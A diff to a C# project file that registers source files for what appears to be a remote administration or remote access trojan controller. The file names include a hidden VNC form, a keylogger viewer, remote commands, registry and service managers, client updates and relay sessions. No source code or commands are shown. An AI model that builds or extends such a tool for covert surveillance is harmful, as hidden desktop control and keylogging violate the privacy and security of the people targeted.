@@ -100,6 +100,8 @@
     <Reference Include="System.Core">
       <RequiredTargetFramework>3.5</RequiredTargetFramework>
     </Reference>
+    <Reference Include="System.Data" />
+    <Reference Include="System.Xml" />
     <Reference Include="System.Drawing" />
     <Reference Include="System.Windows.Forms" />
   </ItemGroup>
@@ -121,11 +123,20 @@
     <Compile Include="FrmCaptureScreen.cs">
       <SubType>Form</SubType>
     </Compile>
+    <Compile Include="FrmCaptureScreen.Input.cs">
+      <DependentUpon>FrmCaptureScreen.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmCaptureScreen.Menu.cs">
+      <DependentUpon>FrmCaptureScreen.cs</DependentUpon>
+    </Compile>
     <Compile Include="FrmCaptureScreen.Designer.cs">
       <DependentUpon>FrmCaptureScreen.cs</DependentUpon>
     </Compile>
     <Compile Include="FrmHVNC.cs">
       <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmHVNC.Input.cs">
+      <DependentUpon>FrmHVNC.cs</DependentUpon>
     </Compile>
     <Compile Include="FrmHVNC.Designer.cs">
       <DependentUpon>FrmHVNC.cs</DependentUpon>
@@ -157,6 +168,123 @@
     <Compile Include="FrmMain.cs">
       <SubType>Form</SubType>
     </Compile>
+    <Compile Include="FrmMain.ContextMenuExtensions.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.FormManagement.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.Dashboard.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.DashboardGroups.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.DashboardRows.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.WorkspacePopups.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.NavigationRelay.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.ClientMenuSetup.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.ClientMenuSessions.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.ClientMenuServiceActions.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.ClientMenuAdmin.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.ClientMenuFileActions.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.ClientMenuMaintenance.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.SkinMenus.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.SkinDisplayNames.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.IconResources.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.PacketHandling.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.PacketFileLists.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.PacketCapture.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.PacketFileOperations.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.PacketRegistry.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.PacketToolResponses.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.ClientTree.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.SkinApply.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.TreeOutput.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.FileTransfer.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.FileUploadTransfer.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.RemoteCommands.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.RemotePowerCommands.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.RemoteSessionActions.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.FileManager.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.FileManagerContextMenu.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.FileManagerContextActions.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.FileToolbarActions.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.ProcessMenu.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.ToolbarActions.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.ClientUpdate.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.SubControllerBridge.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.Registry.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
     <Compile Include="FrmMain.Designer.cs">
       <DependentUpon>FrmMain.cs</DependentUpon>
     </Compile>
@@ -187,6 +315,9 @@
     <Compile Include="FrmSettings.cs">
       <SubType>Form</SubType>
     </Compile>
+    <Compile Include="FrmSettings.Generation.cs">
+      <DependentUpon>FrmSettings.cs</DependentUpon>
+    </Compile>
     <Compile Include="FrmSettings.Designer.cs">
       <DependentUpon>FrmSettings.cs</DependentUpon>
     </Compile>
@@ -194,9 +325,47 @@
     <Compile Include="PacketReceivedEventArgs.cs" />
     <Compile Include="PasteInfo.cs" />
     <Compile Include="Program.cs" />
+    <Compile Include="StartupTrace.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
     <Compile Include="SendCommandHotKey.cs" />
     <Compile Include="Settings.cs" />
+    <Compile Include="FileBundler.cs" />
+    <Compile Include="FrmHostInfo.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmHostInfo.Response.cs">
+      <DependentUpon>FrmHostInfo.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmKeylogger.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmNetworkInfo.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmOnlineLogViewer.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmServiceManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmWindowManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmTgSafeWPackager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmTgHelper.cs">
+      <SubType>Form</SubType>
+    </Compile>
+<Compile Include="FrmSubController.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmSubController.ClientNodes.cs">
+      <DependentUpon>FrmSubController.cs</DependentUpon>
+    </Compile>
+<Compile Include="FrmSubController.Designer.cs">
+      <DependentUpon>FrmSubController.cs</DependentUpon>
+    </Compile>
     <Compile Include="SortableListView.cs">
       <SubType>Component</SubType>
     </Compile>
@@ -219,6 +388,7 @@
     <Compile Include="Utils\IconChanger.cs" />
     <Compile Include="Utils\IconChangerExtensions.cs" />
     <Compile Include="Utils\MsgBox.cs" />
+        <Compile Include="Utils\IPLocationUtil.cs" />
     <EmbeddedResource Include="FrmAbout.resx">
       <DependentUpon>FrmAbout.cs</DependentUpon>
     </EmbeddedResource>
@@ -285,6 +455,12 @@
       <DesignTimeSharedInput>True</DesignTimeSharedInput>
     </Compile>
     <Compile Include="RemoteControlServer.cs" />
+    <Compile Include="RemoteControlServer.ClientSessions.cs">
+      <DependentUpon>RemoteControlServer.cs</DependentUpon>
+    </Compile>
+    <Compile Include="RemoteControlServer.RelayConnection.cs">
+      <DependentUpon>RemoteControlServer.cs</DependentUpon>
+    </Compile>
     <Compile Include="RSCApplication.cs" />
   </ItemGroup>
   <ItemGroup>
